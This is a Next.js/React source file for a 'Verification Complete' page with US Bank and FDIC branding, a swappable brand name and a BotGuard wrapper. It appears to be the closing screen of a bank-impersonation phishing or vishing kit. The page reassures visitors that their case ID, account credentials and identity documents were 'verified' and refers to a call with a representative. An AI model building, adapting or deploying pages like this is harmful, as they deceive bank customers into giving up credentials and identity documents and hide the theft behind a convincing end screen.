'use client';

/**
 * Completed/Success Stage Page
 *
 * Professional success page shown when verification is completed
 */

import { CheckCircle2, Shield, Lock } from 'lucide-react';
import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';

export default function CompletedPage() {
  return (
    <BotGuard>
      <div className="fdic-box">
        <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
        <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
      </div>

      <section className="login-header">
        <h2>Verification Complete</h2>
      </section>

      <div className="login-form">
        {/* Success Icon with visual emphasis */}
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          marginBottom: '24px'
        }}>
          <div style={{
            width: '72px',
            height: '72px',
            borderRadius: '50%',
            background: 'linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            <CheckCircle2 style={{ width: '40px', height: '40px', color: '#2e7d32' }} />
          </div>
        </div>

        {/* Success message box */}
        <div style={{
          background: '#e8f5e9',
          border: '1px solid #a5d6a7',
          borderRadius: '4px',
          padding: '16px',
          marginBottom: '24px'
        }}>
          <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
            <Shield className="h-5 w-5 flex-shrink-0" style={{ color: '#2e7d32', marginTop: '2px' }} />
            <div>
              <p style={{ fontWeight: 500, color: '#1b5e20', marginBottom: '4px', fontSize: '0.875rem' }}>
                Identity Successfully Verified
              </p>
              <p style={{ color: '#2e7d32', fontSize: '0.875rem', lineHeight: 1.5 }}>
                Your identity has been confirmed and your account is now secured. You may safely close this window.
              </p>
            </div>
          </div>
        </div>

        {/* Verification summary */}
        <div style={{
          background: '#f9fafb',
          border: '1px solid #e5e7eb',
          borderRadius: '4px',
          padding: '16px',
          marginBottom: '24px'
        }}>
          <p style={{ fontWeight: 500, color: '#2e2e32', marginBottom: '12px', fontSize: '0.875rem' }}>
            Verification Summary
          </p>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <CheckCircle2 style={{ width: '18px', height: '18px', color: '#2e7d32' }} />
              <span style={{ color: '#333', fontSize: '0.875rem' }}>Case ID verified</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <CheckCircle2 style={{ width: '18px', height: '18px', color: '#2e7d32' }} />
              <span style={{ color: '#333', fontSize: '0.875rem' }}>Account credentials confirmed</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <CheckCircle2 style={{ width: '18px', height: '18px', color: '#2e7d32' }} />
              <span style={{ color: '#333', fontSize: '0.875rem' }}>Identity documents reviewed</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <Lock style={{ width: '18px', height: '18px', color: '#2e7d32' }} />
              <span style={{ color: '#333', fontSize: '0.875rem' }}>Secure session finalized</span>
            </div>
          </div>
        </div>

        {/* What's next info */}
        <div style={{
          background: '#fff',
          border: '1px solid #e5e7eb',
          borderRadius: '4px',
          padding: '16px',
          marginBottom: '24px'
        }}>
          <p style={{ fontWeight: 500, color: '#2e2e32', marginBottom: '8px', fontSize: '0.875rem' }}>
            What happens next?
          </p>
          <p style={{ color: '#555', fontSize: '0.875rem', lineHeight: 1.6 }}>
            Your verification is complete. If you were on a call with a representative, they will guide you through the next steps. Otherwise, you can safely close this window.
          </p>
        </div>

        <div className="link-group">
          <p className="text-sm text-center" style={{ marginTop: '20px', color: 'var(--color-text-secondary)' }}>
            Thank you for banking with {currentBrand.companyName}.
          </p>
        </div>
      </div>
    </BotGuard>
  );
}
